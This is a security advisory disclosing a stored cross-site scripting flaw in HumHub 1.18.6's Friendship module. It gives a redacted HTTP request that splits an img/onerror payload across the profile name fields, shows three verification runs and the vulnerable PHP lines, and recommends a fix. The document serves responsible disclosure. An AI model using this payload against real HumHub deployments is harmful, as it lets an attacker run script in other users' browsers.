# HumHub FriendshipButton displayName stored XSS

## Summary

HumHub 1.18.6 contains stored cross-site scripting in the optional Friendship module. FriendshipButton builds a data-action-confirm attribute with an unencoded user display name. An authenticated user can store a crafted profile name that injects HTML into the confirmation UI when another user visits the attacker's profile. The module is disabled by default but is part of the core distribution.

## Affected product

- Vendor/project: **HumHub**
- Product: **HumHub core Friendship module**
- Affected version: **1.18.6 (Friendship module enabled)**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

Friendship module enabled; authenticated attacker; victim visits the attacker's profile and opens the friendship action.

Verified flow: `profile displayName → FriendshipButton data-action-confirm → confirmation modal HTML`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Enable the core Friendship module.
2. Store an HTML marker in an attacker's profile display name.
3. Visit the profile as another user and open the friendship confirmation.

Sanitized request shape used during verification:

```http
# Friendship module enabled; attacker edits own profile
POST <BASE_URL>/user/account/edit
Cookie: <ATTACKER_SESSION_COOKIE>
Content-Type: application/x-www-form-urlencoded

_csrf=<CSRF>
Profile[firstname]=<img id=gt481023h1rc
Profile[lastname]=src=x onerror=self.x=1>
save=Save profile

# Victim opens the attacker profile and invokes the friendship action
GET <BASE_URL>/u/<ATTACKER_USERNAME>
Cookie: <VICTIM_SESSION_COOKIE>
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `gt481023h1ra` | DB=true; modal IMG=true | **PASS** |
| 2 | `gt481023h1rb` | DB=true; modal IMG=true | **PASS** |
| 3 | `gt481023h1rc` | DB=true; modal IMG=true | **PASS** |

```text
Saved run-3 verification object:
save_status: 200
trigger_status: 200
db_raw_hit: true
browser_modal_img: true
ok: true

Decoded confirmation:
Would you like to send a friendship request to
<strong><img id=gt481023h1rc src=x onerror=self.x=1></strong>?
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
FriendshipButton.php:123-126
'data-action-confirm' => Yii::t(
    'FriendshipModule.base',
    'Would you like to send a friendship request to {userName}?',
    ['{userName}' => '<strong>' . $this->user->getDisplayName() . '</strong>']
)
```

Root cause: The profile display name is wrapped in trusted strong markup and interpolated into a confirmation attribute without encoding; the client later treats it as modal HTML.

## Recommended remediation

Encode getDisplayName() before interpolation, or pass only plain text to the confirmation component and let the widget build safe markup.

## References

- Official source: https://github.com/humhub/humhub/blob/v1.18.6/protected/humhub/modules/friendship/widgets/FriendshipButton.php

## Evidence images

The three public evidence images show, in order:

1. The sanitized reproduction request, endpoint, parameter and payload structure.
2. The three consecutive successful verification runs and exact response/DOM/database excerpts.
3. The highlighted attacker-controlled source and unsafe rendering Sink.

The images are compact reviewer captures rendered from saved raw HTTP/DOM/database evidence. They preserve the verified request, response/DOM evidence, and highlighted source-to-Sink path while redacting credentials and private deployment details.

### Sanitized reproduction

![CAN-14 sanitized reproduction](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-14/01-reproduction-v2.png)

### Three-run success proof

![CAN-14 three-run success proof](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-14/02-success-proof-v2.png)

### Source-to-Sink evidence

![CAN-14 source-to-Sink evidence](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-14/03-source-sink-v2.png)
